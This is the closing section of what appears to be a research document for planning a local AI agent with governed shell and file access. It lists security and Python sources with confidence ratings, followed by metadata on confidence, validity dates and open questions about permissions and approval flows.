- **[Command injection in Python: examples and prevention - Snyk](https://snyk.io/blog/command-injection-python-prevention-examples/)** (Dec 2023) - Command injection vulnerability patterns, prevention techniques
- **[Mastering Python's pathlib: Why You Should Never Use os.path Again](https://python.plainenglish.io/mastering-pythons-pathlib-why-you-should-never-use-os-path-again-af6f16a10cc8)** (Aug 2025) - pathlib best practices, modern Python path handling
- **[Pathlib vs. OS.Path: Choosing the Right Tool for File Path Management - Oreate AI](https://www.oreateai.com/blog/pathlib-vs-ospath-choosing-the-right-tool-for-file-path-management-in-python/)** (Jan 2026) - 2026 comparison of pathlib vs os.path, current best practices
- **[Python Security Vulnerabilities | Top Issues - Aikido](https://www.aikido.dev/blog/python-security-vulnerabilities)** (Jan 2026) - Modern Python security issues, subprocess security patterns
- **【高性能Python服务构建】：基于Asyncio的子进程管理最佳实践** (Jan 2026) - Asyncio subprocess best practices, resource limits configuration
- **[Agentic Desktop Agents: When AI Gets Local File Access - CISO Marketplace](https://cisomarketplace.com/blog/agentic-desktop-agents-ai-local-file-access-security)** (Jan 2026) - Local AI agent filesystem access security considerations
- **[AI Agent Security: The Complete Enterprise Guide for 2026 - MintMCP](https://www.mintmcp.com/blog/ai-agent-security)** (Jan 2026) - AI agent governance frameworks, security practices
- **[Plumbum GitHub Repository](https://github.com/tomerfiliba/plumbum)** - Plumbum library documentation, shell combinators, safe command execution
- **[Plumbum Documentation](https://plumbum.readthedocs.io/)** - Official Plumbum docs, usage examples

### Tertiary (LOW confidence)

- **[9 Python Tools That Keep My Projects From Total Chaos](https://python.plainenglish.io/9-python-tools-that-keep-my-projects-from-total-chaos-a330ffb44e80)** (Oct 2025) - Mentions Plumbum as safe shell scripting tool (needs validation for specific claims)
- **[OpenClaw: Local AI Agent Raises Governance Concerns - LinkedIn](https://www.linkedin.com/posts/rkouissar_openclaw-agenticai-aiarchitecture-activity-7426068832609345536-4giN)** (Feb 2026) - Discussion of local AI agent governance (anecdotal, not technical documentation)
- **[不用学Shell！Python 用Plumbum 一键搞定命令行 - 51CTO](https://www.51cto.com/article/833942.html)** (Jan 2026) - Plumbum promotion article (non-English source, claims need verification)

---

## Metadata

**Confidence breakdown:**
- Standard stack: **HIGH** - subprocess, pathlib, asyncio are Python stdlib (official docs), proven in existing Atom codebase
- Architecture: **HIGH** - Local agent as standalone process follows microservice patterns, REST API communication is standard, existing daemon infrastructure supports it
- Pitfalls: **HIGH** - Command injection and path traversal well-documented in security sources (Snyk, Aikido), subprocess with shell=False is 2026 security best practice
- Directory permissions: **MEDIUM** - Pattern is clear (GovernanceCache extension), but specific permission levels need user validation (Phase 2 planning)
- Command whitelist: **MEDIUM** - Decorator pattern is standard, but specific command categories need user input (STUDENT vs INTERN vs SUPERVISED vs AUTONOMOUS allowances)

**Research date:** February 16, 2026
**Valid until:** March 18, 2026 (30 days - Python subprocess/pathlib patterns are stable, but security best practices evolve)

**Key uncertainties:**
1. User approval flow for STUDENT/INTERN agents (CLI vs WebSocket vs webhook) - needs decision in Phase 2 planning
2. Specific directory permission levels (which dirs for which maturity) - needs user input
3. Testing strategy for CI/CD (mock vs real subprocess) - needs validation in Phase 2.4

**Ready for planning:** **YES** - All core technical domains investigated, standard stack identified, architecture patterns documented, pitfalls cataloged. Planner can create PLAN.md files with confidence.
